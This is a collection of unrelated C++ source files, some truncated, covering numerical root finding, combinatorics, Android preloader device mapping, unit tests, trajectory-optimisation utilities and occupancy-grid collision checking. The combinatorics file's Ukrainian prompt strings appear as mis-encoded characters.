    "\ufeff#include <iostream>\n#include <cmath>\nusing namespace std;\n\n\ndouble f(double x) {\n    return sin(x) * sin(x) - x / 5.0 - 1;\n}\n\ndouble f_prime(double x) {\n    return 2 * sin(x) * cos(x) - 1 / 5.0;\n}\n\ndouble f_double_prime(double x) {\n    return 2 * cos(2 * x);\n}\n\ndouble find_initial_approximation(double a, double b, double tol = 1e-6) {\n    double x = a;\n    while (x <= b) {\n        double fpx = f_prime(x);\n        double fppx = f_double_prime(x);\n\n        if (fabs(fpx) > tol && fabs(2 * f(x) * fppx / (fpx * fpx)) < 1) {\n            return x;\n        }\n        x += (b - a) / 100;\n    }\n    return (a + b) / 2;\n}\n\ndouble newton_method(double x, double tol, int max_iter) {\n    double x_new;\n    int iter = 0;\n\n    while (iter < max_iter) {\n        double fx = f(x);\n        double fpx = f_prime(x);\n\n        if (fabs(fpx) <= tol) {\n            return x;\n        }\n\n        x_new = x - fx / fpx;\n        if (fabs(x - x_new) < tol) {\n            return x_new;  \n        }\n\n        x = x_new;\n        iter++;\n    }\n    return x; \n}\n\nbool is_root_near(double x, double root, double tol) {\n    return fabs(x - root) < tol;\n}\n\nint main() {\n    double a = -4.0, b = 0.0;\n    double tol = 0.001;\n    int max_iter = 100;\n    double step = (b - a) / 100;\n    double x = a, root, root0;\n    bool first = true;\n\n    while (x <= b) {\n        x = find_initial_approximation(x, b);\n        root = newton_method(x, tol, max_iter);\n        if (first)\n        {\n            if (is_root_near(root, x, 0.1)) {\n                cout << \"Root found: \" << root << endl;\n                root0 = root;\n                first = false;\n            }\n        }\n        else\n        {\n            if (is_root_near(root, x, 0.1) &&! is_root_near(root0,root, tol)) {\n                cout << \"Root found: \" << root << endl;\n                root0 = root;\n            }\n        }\n        x += step;\n    }\n    return 0;\n}\n",
    "#include \"Arrangements.h\"\n\nusing namespace std;\n\nunsigned long long Arrangement::getFactorial(unsigned int n) {\n\tif (n == 0) return 1;\n\treturn n * getFactorial(n - 1);\n}\n\nvoid Arrangement::Input() {\n\tunsigned int n = 0, r = 0;\n\tstring checkN, checkR;\n\tdo {\n\t\ttry {\n\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2 N(\u00f6\u00b3\u00eb\u00e5 \u00e4\u00ee\u00e4\u00e0\u00f2\u00ed\u00ba \u00f7\u00e8\u00f1\u00eb\u00ee, \u00ed\u00e5 0): \";\n\t\t\tgetline(cin, checkN);\n\t\t\tif (stol(checkN) <= 0) {\n\t\t\t\tthrow std::out_of_range(\"N \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5 \u00e1\u00f3\u00f2\u00e8 0 \u00e0\u00e1\u00ee \u00e2\u00b3\u00e4'\u00ba\u00ec\u00ed\u00e8\u00ec.\");\n\t\t\t}\n\t\t\tn = stoul(checkN);\n\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ed\u00e5\u00ee\u00e1\u00f5\u00b3\u00e4\u00ed\u00e8\u00f5 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2 R(\u00f6\u00b3\u00eb\u00e5 \u00e4\u00ee\u00e4\u00e0\u00f2\u00ed\u00ba \u00f7\u00e8\u00f1\u00eb\u00ee, \u00ed\u00e5 0 \u00f2\u00e0 \u00ed\u00e5 \u00e1\u00b3\u00eb\u00fc\u00f8\u00e5 \u00ed\u00b3\u00e6 \u00e2\u00e2\u00e5\u00e4\u00e5\u00ed\u00e5 N): \";\n\t\t\tgetline(cin, checkR);\n\t\t\tif (stol(checkR) <= 0 || stoul(checkR) > n) {\n\t\t\t\tthrow std::out_of_range(\"R \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5 \u00e1\u00f3\u00f2\u00e8 0 \u00e0\u00e1\u00ee \u00e1\u00b3\u00eb\u00fc\u00f8\u00e8\u00ec \u00e7\u00e0 N.\");\n\t\t\t}\t\t\t\n\t\t\tr = stoul(checkR);\n\n\t\t\tthis->n = n;\n\t\t\tthis->r = r;\n\t\t\tbreak;\n\t\t}\n\t\tcatch (const std::invalid_argument&) {\n\t\t\tstd::cerr << \"\u00cd\u00e5\u00ef\u00f0\u00e0\u00e2\u00e8\u00eb\u00fc\u00ed\u00ee \u00e2\u00e2\u00e5\u00e4\u00e5\u00ed\u00b3 \u00f7\u00e8\u00f1\u00eb\u00ee\u00e2\u00b3 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff, \u00f1\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f9\u00e5 \u00f0\u00e0\u00e7\" << endl;\n\t\t\tcontinue;\n\t\t}\n\t\tcatch (const std::out_of_range& e) {\n\t\t\tstd::cerr << \"\u00cd\u00e5\u00ef\u00f0\u00e0\u00e2\u00e8\u00eb\u00fc\u00ed\u00ee \u00e2\u00e2\u00e5\u00e4\u00e5\u00ed\u00b3 \u00f7\u00e8\u00f1\u00eb\u00ee\u00e2\u00b3 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff, \u00f1\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f9\u00e5 \u00f0\u00e0\u00e7\" << endl;\n\t\t\tcontinue;\n\t\t}\n\t} while (true);\n}\n\nunsigned long long Arrangement::getArrangementNoRepetition() {\n\tif (this->n == 0 && this->r == 0) {\t\t\n\t\treturn 0;\n\t}\n\tunsigned long long P1 = getFactorial(this->n);\n\tunsigned long long P2 = getFactorial(this->n - this->r);\n\t\n\tcout << endl << \" r     n!\" << endl;\n\tcout << \"A = ________  \"<< endl;\n\tcout << \" n  (n - r)! \" << endl << endl;\n\n\tcout << \"\\t\" << this->n << \"! / (\" << this->n << \" - \" << this->r << \")! = \";\n\tcout << P1 << \" / \" << this->n - this->r << \"! = \" << P1 << \" / \" << P2;\n\tcout << \" = \" << P1 / P2 << endl;\n\n\tcout << \" \" << this->r << endl;\n\tcout << \"A = \" <<  P1 / P2 << endl;\n\tcout << \" \" << this->n << endl;\n\n\treturn P1 / P2;\n}\n\nArrangement::Arrangement(unsigned int n, unsigned int r) {\n\tif (n < r) {\n\t\treturn;\n\t}\n\telse {\n\t\tthis->n = n;\n\t\tthis->r = r;\n\t}\n}\n\nArrangement::Arrangement() {}",
    "/*\n * SPDX-FileCopyrightText: 2024 The LineageOS Project\n * SPDX-License-Identifier: Apache-2.0\n */\n\n#define LOG_TAG \"create_pl_dev\"\n\n#include <android-base/unique_fd.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <libdm/dm.h>\n#include <log/log.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BLOCK_SIZE 512\n\n#define EMMC_HSZ 0x800\n#define UFS_HSZ 0x1000\n\n#define COMBO_HEADER_SIZE 4\n#define UFS_HEADER_SIZE 3\n\n#define UFS_HEADER \"UFS\"\n#define EMMC_HEADER \"EMMC\"\n#define COMBO_HEADER \"COMB\"\n\nusing namespace android::dm;\n\nstruct pl_device {\n    const char* dm_name;\n    const char* dev;\n};\n\nstatic struct pl_device pl_devices[] = {\n        {\"preloader_raw_a\", \"/dev/block/sda\"},\n        {\"preloader_raw_b\", \"/dev/block/sdb\"},\n        {\"preloader_raw_a\", \"/dev/block/mmcblk0boot0\"},\n        {\"preloader_raw_b\", \"/dev/block/mmcblk0boot1\"},\n};\n\nstatic void create_dm_device(const char* name, const char* dev, int start, int count) {\n    DeviceMapper& dm = DeviceMapper::Instance();\n    DmTable table;\n    std::unique_ptr<DmTarget> target;\n    std::string path;\n\n    target = std::make_unique<DmTargetLinear>(0, count, dev, start);\n    if (!table.AddTarget(std::move(target))) {\n        ALOGE(\"Failed to add target for %s.\", name);\n        return;\n    }\n\n    if (!dm.CreateDevice(name, table, &path, std::chrono::milliseconds(500))) {\n        ALOGE(\"Failed to create device %s.\", name);\n        return;\n    }\n\n    ALOGI(\"Created DM device %s at %s.\", name, path.c_str());\n}\n\nint main() {\n    int fd, size, count, start;\n    char header[COMBO_HEADER_SIZE];\n\n    for (int i = 0; i < sizeof(pl_devices) / sizeof(pl_device); i++) {\n        pl_device* device = &pl_devices[i];\n\n        if (access(device->dev, F_OK) == -1) {\n            ALOGE(\"Device %s not found.\", device->dev);\n            continue;\n        }\n\n        fd = open(device->dev, O_RDONLY);\n        if (fd == -1) {\n            ALOGE(\"Failed to open %s: %s.\", device->dev, strerror(errno));\n            continue;\n        }\n\n        size = lseek(fd, 0, SEEK_END);\n        if (size == -1) {\n            ALOGE(\"Failed to seek %s: %s.\", device->dev, strerror(errno));\n            close(fd);\n            continue;\n        }\n\n        count = size / BLOCK_SIZE;\n\n        if (lseek(fd, 0, SEEK_SET) == -1) {\n            ALOGE(\"Failed to seek %s: %s.\", device->dev, strerror(errno));\n            close(fd);\n            continue;\n        }\n\n        if (read(fd, header, COMBO_HEADER_SIZE) != COMBO_HEADER_SIZE) {\n            ALOGE(\"Failed to read %s: %s.\", device->dev, strerror(errno));\n            close(fd);\n            continue;\n        }\n\n        close(fd);\n\n        if (strncmp(header, UFS_HEADER, UFS_HEADER_SIZE) == 0 ||\n            strncmp(header, COMBO_HEADER, COMBO_HEADER_SIZE) == 0) {\n            start = UFS_HSZ / BLOCK_SIZE;\n        } else if (strncmp(header, EMMC_HEADER, COMBO_HEADER_SIZE) == 0) {\n            start = EMMC_HSZ / BLOCK_SIZE;\n        } else {\n            ALOGE(\"Unknown header %s for %s.\", header, device->dev);\n            continue;\n        }\n\n        count -= start;\n\n        create_dm_device(device->dm_name, device->dev, start, count);\n    }\n\n    return 0;\n}",
    "/*\n * ACS_CS_ImComputeResourceNetwork.cpp\n *\n *  Created on: Jan 11, 2017\n *\t\t\t\txmalrao\n */\n\n#include \"ACS_CS_ImComputeResourceNetwork.h\"\n#include \"ACS_CS_ImModel.h\"\n#include \"ACS_CS_Registry.h\"\n#include \"ACS_CS_NetworkDefinitions.h\"\n#include <cstring>\n\n#include <boost/serialization/string.hpp>\n#include <boost/serialization/set.hpp>\n#include <boost/archive/text_iarchive.hpp>\n#include <boost/archive/text_oarchive.hpp>\n#include <boost/archive/binary_iarchive.hpp>\n#include <boost/archive/binary_oarchive.hpp>\n#include <boost/serialization/export.hpp>\n\nBOOST_CLASS_EXPORT_IMPLEMENT(ACS_CS_ImComputeResourceNetwork);\n\nACS_CS_ImComputeResourceNetwork::ACS_CS_ImComputeResourceNetwork()\n{\n   type = CR_NETWORKSTRUCT_T;\n}\n\nACS_CS_ImComputeResourceNetwork::ACS_CS_ImComputeResourceNetwork(const ACS_CS_ImComputeResourceNetwork *other)\n{\n\tcopyObj(other);\n}\n\nACS_CS_ImComputeResourceNetwork::~ACS_CS_ImComputeResourceNetwork()\n{}\n\n\nbool ACS_CS_ImComputeResourceNetwork::isValid(int & errNo, const ACS_CS_ImModel & model)\n{\n\terrNo = 0;\n\n\tif (ACS_CS_Registry::hexMACtoDecMAC((macAddress).c_str()) <= 0)\n\t{\n\t\tACS_CS_ImUtils::setFaultyAttribute(macAddress);\n\t\terrNo = TC_INVALIDMAC;\n\t\treturn false;\n\t}\n\n\tstd::set<const ACS_CS_ImBase*> objects;\n\n\tmodel.getObjects(objects, CR_NETWORKSTRUCT_T);\n\n\t//std::string parentName = ACS_CS_ImUtils::getParentName(rdn).c_str();\n\n\tfor (std::set<const ACS_CS_ImBase*>::iterator it = objects.begin(); it != objects.end(); it++)\n\t{\n\t\t//std::size_t foundParent = ((it->rdn).find(parentName));\n\t\t//if(foundParent!=std::string::npos)\n\t\t//{\n\t\t\tconst ACS_CS_ImComputeResourceNetwork* otherComputeResourceNetworks = dynamic_cast<const ACS_CS_ImComputeResourceNetwork*>(*it);\n\t\t\tif (otherComputeResourceNetworks)\n\t\t\t{\n\t\t\t\tif (networkId.compare(otherComputeResourceNetworks->networkId) != 0)\n\t\t\t\t{\n\t\t\t\t\tif (strcasecmp(macAddress.c_str(),otherComputeResourceNetworks->macAddress.c_str()) == 0) \n\t\t\t\t\t{\n\t\t\t\t\t\tACS_CS_ImUtils::setFaultyAttribute(macAddress);\n\t\t\t\t\t\terrNo = TC_ATTRALREADYUSED;\n\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t  //}\n\t}\n\treturn true;\n}\n\nbool ACS_CS_ImComputeResourceNetwork::modify(ACS_APGCC_AttrModification **attrMods)\n{\n   for (int i = 0; attrMods[i] != NULL; i++)\n\t{\n\t\t//ACS_APGCC_AttrModification *atrMod = attrMods[i];\n\n\t\t/*if (atrMod->modType != ACS_APGCC_ATTR_VALUES_REPLACE)\n\t\t\treturn false;*/\n\n\t\tACS_APGCC_AttrValues *modAttr = &attrMods[i]->modAttr;\n\n\t\tif (strcmp(modAttr->attrName, \"id\") == 0)\n\t\t{\n\t\t\tif (modAttr->attrValuesNum > 0)\n\t\t\t\tnetworkId = (char *) modAttr->attrValues[0];\n\t\t\telse\n\t\t\t\tnetworkId = \"\";\n\t\t}\n\t\telse if (strcmp(modAttr->attrName, \"nicName\") == 0)\n\t\t{\n\t\t\tif (modAttr->attrValuesNum > 0)\n\t\t\t\tnicName = (char *) modAttr->attrValues[0];\n\t\t\telse\n\t\t\t\tnicName = \"\";\n\t\t}\n\t\telse if (strcmp(modAttr->attrName, \"netName\") == 0)\n\t\t{\n\t\t\tif (modAttr->attrValuesNum > 0)\n\t\t\t\tnetName = (char *) modAttr->attrValues[0];\n\t\t\telse\n\t\t\t\tnetName = \"\";\n\t\t}\n\t\telse if (strcmp(modAttr->attrName, \"macAddress\") == 0)\n\t\t{\n\t\t\tif (modAttr->attrValuesNum > 0)\n\t\t\t\tmacAddress = (char *) modAttr->attrValues[0];\n\t\t\telse\n\t\t\t\tmacAddress = \"\";\n\t\t}\n\t\telse\n\t\t\t// Bad attributeName\n\t\t\treturn false;\n\t}\n\n\treturn true;\n}\n\nACS_CS_ImBase * ACS_CS_ImComputeResourceNetwork::clone() const\n{\n   ACS_CS_ImBase *network = new ACS_CS_ImComputeResourceNetwork(*this);\n   return network;\n}\n\n\nbool ACS_CS_ImComputeResourceNetwork::equals(const ACS_CS_ImBase &obj) const\n{\n   if (!ACS_CS_ImBase::equals(obj))\n\t\treturn false;\n\n\ttry\n\t{\n\t\tconst ACS_CS_ImComputeResourceNetwork & other = dynamic_cast<const ACS_CS_ImComputeResourceNetwork &>(obj);\n\n\t\tif (networkId != other.networkId)\n\t\t\treturn false;\n\t\tif (nicName != other.nicName)\n\t\t\treturn false;\n\t\tif (netName != other.netName)\n\t\t\treturn false;\n\t\tif (macAddress != other.macAddress)\n\t\t\treturn false;\n\t}\n\tcatch (const std::bad_cast &e)\n\t{\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n\nvoid ACS_CS_ImComputeResourceNetwork::copyObj(const ACS_CS_ImComputeResourceNetwork *other)\n{\n\trdn = other->rdn;\n\ttype = other->type;\n\taction = other->action;\n\tnetworkId = other->networkId;\n\tnicName = other->nicName;\n\tnetName = other->netName;\n\tmacAddress = other->macAddress;\n}\n\nACS_CS_ImImmObject * ACS_CS_ImComputeResourceNetwork::toImmObject(bool onlyModifiedAttrs)\n{\n   ACS_CS_ImImmObject *immObject = new ACS_CS_ImImmObject();\n\n   immObject->setClassName(ACS_CS_ImmMapper::CLASS_COMPUTE_RESOURCE_NETWORK.c_str());\n   immObject->setParentName(ACS_CS_ImUtils::getParentName(rdn).c_str());\n\n   std::vector<ACS_CS_ImValuesDefinitionType> attrList;\n\n   if(!onlyModifiedAttrs)\n   \t   attrList.push_back(ACS_CS_ImUtils::createStringType(\"id\", networkId));\n\n   if (!netName.empty())\n\t   attrList.push_back(ACS_CS_ImUtils::createStringType(\"netName\", netName));\n   else\n\t   attrList.push_back(ACS_CS_ImUtils::createEmptyStringType(\"netName\"));\n\n   if (!macAddress.empty())\n\t   attrList.push_back(ACS_CS_ImUtils::createStringType(\"macAddress\", macAddress));\n   else\n\t   attrList.push_back(ACS_CS_ImUtils::createEmptyStringType(\"macAddress\"));\n\n   if (!nicName.empty",
    "#include<iostream>\r\nint main ()\r\n{\r\n    std::string Nama;\r\n    std::cout << \"Nama : \";\r\n    std::cout << \"Gebby Minda Saputri \" << Nama << std::endl;\r\n    std::string NPM;\r\n    std::cout << \"NPM : \";\r\n    std::cout << \"2410631170021\" << NPM << std::endl;\r\n    std::string Kelas;\r\n    std::cout << \"Kelas : \";\r\n    std::cout << \"1E Informatika\" << Kelas << std::endl;\r\n    std::string Citacita;\r\n    std::cout << \"Cita-cita : \";\r\n    std::cout << \"Menjadi WNA, orang kaya gaji 5 digit, programmer(AAMIIN BGTT)\" << Citacita << std::endl;\r\n    std::string MotivasimasukInformatika;\r\n    std::cout << \"Motivasi masuk jurusan Informatika : \";\r\n    std::cout << \"Peluang karir yang luas dan gaji yag kompetitif serta dikarenakan teknologi semakin canggih yang membuat saya tertarik masuk kedalam IT dan juga supaya saya tidak ketinggalan zaman.\" << MotivasimasukInformatika << std::endl;\r\n    std::string Harapan;\r\n    std::cout << \"Harapan : \";\r\n    std::cout << \"Semoga cita-cita tersebut bisa tercapai dan semoga mendapat IPK 4.00 serta bisa study abroad/MSIB melalui MBKM dan menjadi ketua di salah satu ormawa.\" << Harapan << std::endl;\r\n    std::cin >> Nama, Kelas, NPM, Citacita, MotivasimasukInformatika, Harapan;\r\n    return 0;\r\n\r\n}\r\n",
    "#include \"CalculFrais.h\"\n#include <string>\n#include \"gtest/gtest.h\"\n#include \"gmock/gmock.h\"\n#include \"MockParam.h\"\n\nnamespace {\nclass demo : public::testing::TestWithParam<testing::tuple<double,double,double> >\n{\n\n //  cr\u00e9er un set UP\n     void SetUp() override {\n         std::cout << \"ceci est mon nouveau setUP\";     }\n\n};\nclass Param : public::testing::TestWithParam<testing::tuple<double,double> >\n{\n    protected:\n        CalculFrais frais;\n        double montant;\n        double resAtt;\n\n //  cr\u00e9er un set UP\n     void SetUp() override {\n         std::cout << \"ceci est le setUP de ma class Param\";\n        montant = testing::get<0>(GetParam());\n        resAtt = testing::get<1>(GetParam());\n   }\n};\n\nTEST(CalculTest, testSimple) {\n    CalculFrais frais;\n    EXPECT_DOUBLE_EQ(frais.montant(450.0),20.0);\n}\n\n\nTEST(CalculTest, testAvecMock) {\n    MockParam toto;\n    CalculFrais frais;\n    EXPECT_CALL(toto,getLimit1()).WillOnce(testing::Return(200.0));\n    EXPECT_CALL(toto,getLimit2()).WillOnce(testing::Return(500.0));\n    frais.setLimit(&toto);\n    EXPECT_DOUBLE_EQ(frais.montant(450.0),20.0);\n}\nTEST(CalculTest, test2) {\n    MockParam toto;\n    CalculFrais frais;\n    EXPECT_CALL(toto,getLimit1()).WillOnce(testing::Return(200.0));\n    EXPECT_CALL(toto,getLimit2()).WillOnce(testing::Return(500.0));\n    frais.setLimit(&toto);\n    EXPECT_DOUBLE_EQ(frais.montant(450.0),20.0);\n}\nTEST_P(Param, testParametrise)\n{\n\n    EXPECT_DOUBLE_EQ(frais.montant(montant),resAtt);\n\n}\nINSTANTIATE_TEST_SUITE_P(ValeurAvecTuple,Param,testing::Values(testing::make_tuple(550.0,0.0),testing::make_tuple(100,30.0)));\n\nTEST_P(demo, test5)\n{\n    double op1 = testing::get<0>(GetParam());\n    double op2 = testing::get<1>(GetParam());\n    double res = testing::get<2>(GetParam());\n    EXPECT_DOUBLE_EQ(op1*op2,res);\n\n}\nINSTANTIATE_TEST_SUITE_P(ValeurAvecTuple,demo,testing::Values(testing::make_tuple(1.0,2.0,2.0),testing::make_tuple(1.0,2.0,3.0)));\n }\n\n\nint main(int argc, char**argv)\n{\n    ::testing::InitGoogleTest(&argc,argv);\n    return RUN_ALL_TESTS();\n}\n",
    "//\n// Created by Brian Jackson on 9/27/22.\n// Copyright (c) 2022 Robotic Exploration Lab. All rights reserved.\n//\n\n#include \"AltroTestUtils.hpp\"\n\n#include <vector>\n#include <string>\n#include <fstream>\n#include <filesystem>\n\n#include \"nlohmann/json.hpp\"\n\nnamespace fs = std::filesystem;\nusing json = nlohmann::json;\n\nvoid discrete_double_integrator_dynamics(double *xnext, const double *x, const double *u, float h,\n                                         int dim) {\n  double b = h * h / 2;\n  for (int i = 0; i < dim; ++i) {\n    xnext[i] = x[i] + x[i + dim] * h + u[i] * b;\n    xnext[i + dim] = x[i + dim] + u[i] * h;\n  }\n};\n\nvoid discrete_double_integrator_jacobian(double *jac, const double *x, const double *u, float h,\n                                         int dim) {\n  (void)x;\n  (void)u;\n  Eigen::Map<Eigen::MatrixXd> J(jac, 2 * dim, 3 * dim);\n  J.setZero();\n  double b = h * h / 2;\n  for (int i = 0; i < dim; ++i) {\n    J(i, i) = 1.0;\n    J(i + dim, i + dim) = 1.0;\n    J(i, i + dim) = h;\n    J(i, 2 * dim + i) = b;\n    J(i + dim, 2 * dim + i) = h;\n  }\n}\n\nconst double kPendulumMass = 1.0;\nconst double kPendulumLength = 0.5;\nconst double kPendulumFrictionCoeff = 0.1;\nconst double kPendulumInertia = 0.25;\nconst double kPendulumGravity = 9.81;\n\nvoid pendulum_dynamics(double *xnext, const double *x, const double *u) {\n  double l = kPendulumLength;\n  double g = kPendulumGravity;\n  double b = kPendulumFrictionCoeff;\n  double m = kPendulumMass * l * l;\n\n  double theta = x[0];\n  double omega = x[1];\n\n  double omega_dot = u[0] / m - g * std::sin(theta) / l - b * omega / m;\n  xnext[0] = omega;\n  xnext[1] = omega_dot;\n}\n\nvoid pendulum_jacobian(double *jac, const double *x, const double *u) {\n  (void)u;\n  double l = kPendulumLength;\n  double g = kPendulumGravity;\n  double b = kPendulumFrictionCoeff;\n  double m = kPendulumMass * l * l;\n\n  double domega_dtheta = 0.0;\n  double domega_domega = 1.0;\n  double domega_du = 0.0;\n  double dalpha_dtheta = -g * std::cos(x[0]) / l;\n  double dalpha_domega = -b / m;\n  double dalpha_du = 1 / m;\n  jac[0] = domega_dtheta;\n  jac[1] = dalpha_dtheta;\n  jac[2] = domega_domega;\n  jac[3] = dalpha_domega;\n  jac[4] = domega_du;\n  jac[5] = dalpha_du;\n}\n\naltro::ExplicitDynamicsFunction midpoint_dynamics(int n, int m, ContinuousDynamicsFunction f) {\n  auto fd = [n, m, f](double *xn, const double *x, const double *u, float h) {\n    static Eigen::VectorXd xm(n);\n    Eigen::Map<Eigen::VectorXd> xn_vec(xn, n);\n    Eigen::Map<const Eigen::VectorXd> x_vec(x, n);\n    Eigen::Map<const Eigen::VectorXd> u_vec(u, n);\n    f(xm.data(), x, u);\n    xm *= h / 2;\n    xm.noalias() += x_vec;\n    f(xn, xm.data(), u);\n    xn_vec = x_vec + h * xn_vec;\n  };\n  return fd;\n}\n\naltro::ExplicitDynamicsJacobian midpoint_jacobian(int n, int m, ContinuousDynamicsFunction f,\n                                                 ContinuousDynamicsJacobian df) {\n  auto fd = [n, m, f, df](double *jac, const double *x, const double *u, float h) {\n    static Eigen::MatrixXd A(n, n);\n    static Eigen::MatrixXd B(n, m);\n    static Eigen::MatrixXd Am(n, n);\n    static Eigen::MatrixXd Bm(n, m);\n    static Eigen::VectorXd xm(n);\n    static Eigen::MatrixXd In = Eigen::MatrixXd::Identity(n, n);\n\n    Eigen::Map<Eigen::MatrixXd> J(jac, n, n + m);\n    Eigen::Map<const Eigen::VectorXd> x_vec(x, n);\n    Eigen::Map<const Eigen::VectorXd> u_vec(u, n);\n\n    // Evaluate the midpoint\n    f(xm.data(), x, u);\n    xm = x_vec + h / 2 * xm;\n\n    // Evaluate the Jacobian\n    df(J.data(), x, u);\n    A = J.leftCols(n);\n    B = J.rightCols(m);\n\n    // Evaluate the Jacobian at the midpoint\n    df(J.data(), xm.data(), u);\n    Am = J.leftCols(n);\n    Bm = J.rightCols(m);\n\n    // Apply the chain rule\n    J.leftCols(n) = In + h * Am * (In + h / 2 * A);\n    J.rightCols(m) = h * (Am * h / 2 * B + Bm);\n  };\n  return fd;\n}\n\nvoid BicycleModel::Dynamics(double *x_dot, const double *x, const double *u) const {\n  double v = u[0];          // longitudinal velocity (m/s)\n  double delta_dot = u[1];  // steering angle rage (rad/s)\n  double theta = x[2];      // heading angle (rad) relative to x-axis\n  double delta = x[3];      // steering angle (rad)\n\n  double beta = 0;\n  double omega = 0;\n  double stheta = 0;\n  double ctheta = 0;\n  switch (reference_frame_) {\n    case ReferenceFrame::CenterOfGravity:\n      beta = std::atan2(distance_to_rear_wheels_ * delta, length_);\n      omega = v * std::cos(beta) * std::tan(delta) / length_;\n      stheta = std::sin(theta + beta);\n      ctheta = std::cos(theta + beta);\n      break;\n    case ReferenceFrame::Rear:\n      omega = v * tan(delta) / length_;\n      stheta = std::sin(theta);\n      ctheta = std::cos(theta);\n      break;\n    case ReferenceFrame::Front:\n      omega = v * std::sin(delta) / length_;\n      stheta = std::sin(theta + delta);\n      ctheta = std::cos(theta + delta);\n      break;\n  };\n  double px_dot = v * ctheta;\n  double py_dot = v * stheta;\n  x_dot[0] = px_dot;\n  x_dot[1] = py_dot;\n  x_dot[2] = omega;\n  x_dot[3] = delta_dot;\n}\n\nvoid B",
    "#include \"Grid_map.h\"\n\nGrid_map::Grid_map(const nav_msgs::msg::OccupancyGrid &map_data)\n{\n    map_data_ = map_data;\n    resolution = map_data.info.resolution;\n    originX = map_data.info.origin.position.x;\n    originY = map_data.info.origin.position.y;\n    width = map_data.info.width;\n    height = map_data.info.height;\n    Max_origin_x = originX + width * resolution;\n    Max_origin_y = originY + height * resolution;\n\n    // static_map_orig_.resize(width * height, 0);\n    // updateMap();\n    // // cout size the new obstacle list\n    // cout << \"new_obstacle_list_ size: \" << new_obstacle_list_.size() << endl;\n\n    // // cout size the new vacancy list\n    // cout << \"new_vacancy_list_ size: \" << new_vacancy_list_.size() << endl;\n}\n\nGrid_map::~Grid_map()\n{\n}\n\nvoid Grid_map::updateMap()\n{\n    // Loop through the entire map data\n    for (int i = 0; i < static_map_orig_.size(); ++i)\n    {\n        // Check if the grid is occupied (based on the threshold) and was previously unoccupied\n        if ((map_data_.data[i] > free_thres_ || map_data_.data[i] < 0) && static_map_orig_[i] == 0)\n        {\n            // Mark the grid as occupied and add it to the obstacle list\n            static_map_orig_[i] = 1;\n            new_obstacle_list_.emplace_back(i);\n        }\n        // Check if the grid is now free but was previously occupied\n        else if (map_data_.data[i] < free_thres_ && static_map_orig_[i] == 1)\n        {\n            // Mark the grid as free and add it to the vacancy list\n            static_map_orig_[i] = 0;\n            new_vacancy_list_.emplace_back(i);\n        }\n        // Continue if the grid's state remains unchanged\n    }\n}\n\nbool Grid_map::checkCollision(const State &state, const geometry_msgs::msg::Polygon &vehicle_poly_state)\n{\n\n    obstacle_polys.clear(); // Clear the obstacle polygons\n    // Define the 5 meter offset\n    double offset = 5.0;\n\n    // Define the bounds for the region to check\n    double min_x = std::max(originX, state.x - offset);\n    double max_x = std::min(originX + width * resolution, state.x + offset);\n    double min_y = std::max(originY, state.y - offset);\n    double max_y = std::min(originY + height * resolution, state.y + offset);\n\n    // Convert bounds to grid indices\n    uint32_t min_i = std::max(0, static_cast<int>((min_y - originY) / resolution));\n    uint32_t max_i = std::min(static_cast<int>(height) - 1, static_cast<int>((max_y - originY) / resolution));\n    uint32_t min_j = std::max(0, static_cast<int>((min_x - originX) / resolution));\n    uint32_t max_j = std::min(static_cast<int>(width) - 1, static_cast<int>((max_x - originX) / resolution));\n\n    // Check each relevant cell in the occupancy grid\n    for (uint32_t i = min_i; i <= max_i; ++i)\n    {\n        for (uint32_t j = min_j; j <= max_j; ++j)\n        {\n            if (map_data_.data[i * width + j] > 0)\n            {\n                double x = originX + j * resolution;\n                double y = originY + i * resolution;\n                geometry_msgs::msg::Polygon poly = createObstaclePolygon(x, y, resolution);\n                // log the obstacle polygon\n                // for (const auto &point : poly.points)\n                // {\n                //     cout << \"x: \" << point.x << \" y: \" << point.y << endl;\n                // }\n                obstacle_polys.push_back(poly);\n\n                if (collision_checker.check_collision(vehicle_poly_state, poly))\n                {\n                    return true; // Collision detected\n                }\n            }\n        }\n    }\n\n    return false; // No collision detected\n}\n\ngeometry_msgs::msg::Polygon Grid_map::createObstaclePolygon(double x, double y, double resolution) const\n{\n    geometry_msgs::msg::Polygon obstacle_poly;\n    double half_res = resolution / 2.0;\n\n    // Adjust (x, y) to ensure the center of the polygon aligns with the grid cell\n    x += resolution / 2;\n    y += resolution / 2;\n\n    geometry_msgs::msg::Point32 p1, p2, p3, p4;\n    p1.x = x - half_res;\n    p1.y = y - half_res;\n    p2.x = x + half_res;\n    p2.y = y - half_res;\n    p3.x = x + half_res;\n    p3.y = y + half_res;\n    p4.x = x - half_res;\n    p4.y = y + half_res;\n\n    obstacle_poly.points.push_back(p1);\n    obstacle_poly.points.push_back(p2);\n    obstacle_poly.points.push_back(p3);\n    obstacle_poly.points.push_back(p4);\n    obstacle_poly.points.push_back(p1); // Close the polygon\n\n    return obstacle_poly;\n}\n\nstd::tuple<int, int> Grid_map::toCellID(State state_)\n{\n    int cell_x = static_cast<int>((state_.x - originX) / resolution);\n    int cell_y = static_cast<int>((state_.y - originY) / resolution);\n\n    return std::make_tuple(cell_x, cell_y);\n}\n\nint Grid_map::toCellIndex(int x, int y)\n{\n    // where i is the row (y) and j is the column (x)\n    return y * width + x;\n}\n\nbool Grid_map::isPointInBounds(int x, int y)\n{\n    return x >= 0 && x < width && y >= 0 && y < height;\n}\n\nbool Grid_map::isInCollision(int x, int y)\n{\n    if (!isPointInBounds(x, y))\n    {\n        